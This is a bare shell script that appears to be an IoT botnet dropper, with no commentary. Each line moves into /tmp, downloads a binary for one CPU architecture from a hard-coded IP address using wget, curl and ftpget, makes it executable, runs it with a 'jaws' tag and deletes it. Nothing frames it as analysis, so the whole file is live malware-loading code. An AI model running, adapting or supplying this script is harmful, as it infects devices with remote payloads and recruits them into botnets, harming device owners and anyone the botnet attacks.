#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp; wget http://213.209.143.176/arm; curl -O http://213.209.143.176/arm; ftpget -v 213.209.143.176 arm arm; chmod 777 arm; ./arm jaws.arm.wget; rm -rf arm
cd /tmp; wget http://213.209.143.176/arm5; curl -O http://213.209.143.176/arm5; ftpget -v 213.209.143.176 arm5 arm5; chmod 777 arm5; ./arm5 jaws.arm5.wget; rm -rf arm5
cd /tmp; wget http://213.209.143.176/arm6; curl -O http://213.209.143.176/arm6; ftpget -v 213.209.143.176 arm6 arm6; chmod 777 arm6; ./arm6 jaws.arm6.wget; rm -rf arm6
cd /tmp; wget http://213.209.143.176/arm7; curl -O http://213.209.143.176/arm7; ftpget -v 213.209.143.176 arm7 arm7; chmod 777 arm7; ./arm7 jaws.arm7.wget; rm -rf arm7
cd /tmp; wget http://213.209.143.176/i486; curl -O http://213.209.143.176/i486; ftpget -v 213.209.143.176 i486 i486; chmod 777 i486; ./i486 jaws.i486.wget; rm -rf i486
cd /tmp; wget http://213.209.143.176/i686; curl -O http://213.209.143.176/i686; ftpget -v 213.209.143.176 i686 i686; chmod 777 i686; ./i686 jaws.i686.wget; rm -rf i686
cd /tmp; wget http://213.209.143.176/m68k; curl -O http://213.209.143.176/m68k; ftpget -v 213.209.143.176 m68k m68k; chmod 777 m68k; ./m68k jaws.m68k.wget; rm -rf m68k
cd /tmp; wget http://213.209.143.176/mips; curl -O http://213.209.143.176/mips; ftpget -v 213.209.143.176 mips mips; chmod 777 mips; ./mips jaws.mips.wget; rm -rf mips
cd /tmp; wget http://213.209.143.176/mpsl; curl -O http://213.209.143.176/mpsl; ftpget -v 213.209.143.176 mpsl mpsl; chmod 777 mpsl; ./mpsl jaws.mpsl.wget; rm -rf mpsl
cd /tmp; wget http://213.209.143.176/ppc; curl -O http://213.209.143.176/ppc; ftpget -v 213.209.143.176 ppc ppc; chmod 777 ppc; ./ppc jaws.ppc.wget; rm -rf ppc
cd /tmp; wget http://213.209.143.176/sh4; curl -O http://213.209.143.176/sh4; ftpget -v 213.209.143.176 sh4 sh4; chmod 777 sh4; ./sh4 jaws.sh4.wget; rm -rf sh4
cd /tmp; wget http://213.209.143.176/spc; curl -O http://213.209.143.176/spc; ftpget -v 213.209.143.176 spc spc; chmod 777 spc; ./spc jaws.spc.wget; rm -rf spc
cd /tmp; wget http://213.209.143.176/x86; curl -O http://213.209.143.176/x86; ftpget -v 213.209.143.176 x86 x86; chmod 777 x86; ./x86 jaws.x86.wget; rm -rf x86
cd /tmp; wget http://213.209.143.176/x86_64; curl -O http://213.209.143.176/x86_64; ftpget -v 213.209.143.176 x86_64 x86_64; chmod 777 x86_64; ./x86_64 jaws.x86_64.wget; rm -rf x86_64
cd /tmp; wget http://213.209.143.176/sh4; curl -O http://213.209.143.176/sh4; ftpget -v 213.209.143.176 sh4 sh4; chmod 777 sh4; ./sh4 jaws.sh4.wget; rm -rf sh4
